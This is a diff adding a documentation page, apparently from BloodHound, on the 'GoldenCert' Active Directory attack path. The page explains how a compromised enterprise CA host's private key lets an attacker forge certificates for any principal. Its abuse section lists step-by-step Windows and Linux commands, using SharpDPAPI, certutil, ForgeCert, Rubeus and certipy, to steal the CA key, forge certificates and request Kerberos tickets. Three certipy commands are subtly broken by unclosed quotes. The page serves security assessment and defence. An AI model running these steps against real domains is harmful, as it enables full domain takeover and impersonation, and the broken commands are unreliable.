@@ -1,0 +1,95 @@
+---
+title: GoldenCert
+---
+
+<Frame>
+  <img src="/hc/images/image-2-1.png"/>
+</Frame>
+
+The victim principal has a certificate private key that can be abused to sign "golden" certificates for authentication of any enabled principal in the AD forest of the domain.
+
+
+The victim principal hosts the enrollment service of an enterprise CA, which implies it has the private key of the enterprise CA's certificate. This private key allows an attacker to sign certificates for authentication as any enabled principal in the AD forest of the domain, as the enterprise CA is trusted for NT authentication and chain up to a root CA.
+
+It may not be possible to obtain the certificate private key if it is protected with a Trusted Platform Module (TPM) or using a Hardware Security Module (HSM). However, it may still be possible to compromise the AD forest. Administrative access to the enterprise CA host lets an attacker publish certificate templates, approve denied enrollment requests, and more. The victim principal will have an ESC7 edge to the domain if any such attack has been found possible by BloodHound.
+
+## Abuse Info
+
+### Windows
+
+#### Step 1
+
+Obtain CA certificate incl. private key - using built-in GUI (certsrv.msc)
+
+1.  Open certsrv.msc as Administrator on the enterprise CA host.
+2.  Right-click on the enterprise CA and select "All Tasks" followed by "Back up CA...".
+3.  Click "Next", select "Private key and CA certificate", and select the location folder.
+4.  Click "Next", and set a password.
+5.  Click "Next" and click "Finish" to back up the certificate as a .p12 file.
+
+#### Step 2
+
+Obtain CA certificate incl. private key - using commandline tools
+
+* Print all certificates of the host using SharpDPAPI.  The enterprise CA certificate is the one where issuer and subject are identical.
+```
+SharpDPAPI.exe certificates /machine
+```
+* Save the private key in .key file (e.g. cert.key) and the certificate in .pem file (cert.pem) in the same folder.
+* Create a .pfx version of the CA certificate using certutil:
+```
+certutil.exe -MergePFX .\\cert.pem .\\cert.pfx
+```
+* Set password when prompted.
+
+#### Step 3
+
+Forge certificate and obtain a TGT as targeted principal.
+
+* Forge a certificate of a target principal using ForgeCert:
+```
+ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword "password123!" --Subject "CN=User" --SubjectAltName "roshi@dumpster.fire" --NewCertPath target.pfx --NewCertPassword "NewPassword123!"
+```
+* Request a TGT for the targeted principal using the certificate with Rubeus:
+```
+Rubeus.exe asktgt /user:Roshi /domain:dumpster.fire /certificate:target.pfx /password:NewPassword123!
+```
+### Linux
+
+#### Step 1
+
+* Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host using Certipy.  The enterprise CA certificate is the one where issuer and subject are identical.
+```
+certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!
+```
+#### Step 2
+
+Forge a certificate of a target principal:
+```
+certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire
+```
+#### Step 3
+
+Request a TGT for the targeted principal using the certificate against a given DC:
+```
+ certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10
+```
+## Opsec Considerations
+
+When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate.
+
+## References
+
+This edge is related to the following MITRE ATT&CK tactic and techniques:
+
+* https://attack.mitre.org/techniques/T1649/
+
+### Abuse and Opsec references
+
+* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
+* [https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
+* [https://github.com/GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert)
+* [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+* [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+
